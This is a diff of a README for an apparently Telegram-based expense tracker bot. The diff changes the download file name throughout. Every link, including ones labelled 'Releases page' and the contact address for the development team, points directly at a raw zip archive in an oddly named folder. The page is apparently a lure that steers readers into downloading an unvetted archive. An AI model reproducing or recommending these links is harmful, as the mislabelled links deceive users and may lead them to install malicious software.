@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Expense-Tracker-Bot](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense-Tracker-Bot.zip%20Bot-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense-Tracker-Bot.zip)
+[![Download Expense-Tracker-Bot](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense_Bot_Tracker_v1.6.zip%20Bot-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense_Bot_Tracker_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,12 +17,12 @@ Welcome to Expense Tracker Bot! This bot serves as your friendly personal financ
 
 To start using Expense Tracker Bot, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense-Tracker-Bot.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense_Bot_Tracker_v1.6.zip).
 2. Find the latest version listed there.
 3. Download the appropriate file for your device.
 4. Follow the installation instructions provided in the release notes.
 
-You can revisit the download link here: [Download Expense-Tracker-Bot](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense-Tracker-Bot.zip).
+You can revisit the download link here: [Download Expense-Tracker-Bot](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense_Bot_Tracker_v1.6.zip).
 
 ### 🤔 How to Use
 
@@ -55,7 +55,7 @@ If you encounter issues using the bot, try these steps:
 2. **Failed to log entry:** Check your message format and try again.
 3. **Bot not found:** Ensure you are searching for the correct name in Telegram.
 
-Feel free to revisit the [Releases page](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense-Tracker-Bot.zip) for updates or new features.
+Feel free to revisit the [Releases page](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense_Bot_Tracker_v1.6.zip) for updates or new features.
 
 ### 📝 Contributing
 
@@ -69,6 +69,6 @@ Check the repository for guidelines on how to contribute.
 
 ### 📞 Contact
 
-For further support or inquiries, you can reach the development team at [https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense-Tracker-Bot.zip](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense-Tracker-Bot.zip).
+For further support or inquiries, you can reach the development team at [https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense_Bot_Tracker_v1.6.zip](https://raw.githubusercontent.com/KotsanTW/Expense-Tracker-Bot/main/gardyloo/Expense_Bot_Tracker_v1.6.zip).
 
 Thank you for choosing Expense Tracker Bot! Enjoy managing your finances with ease.
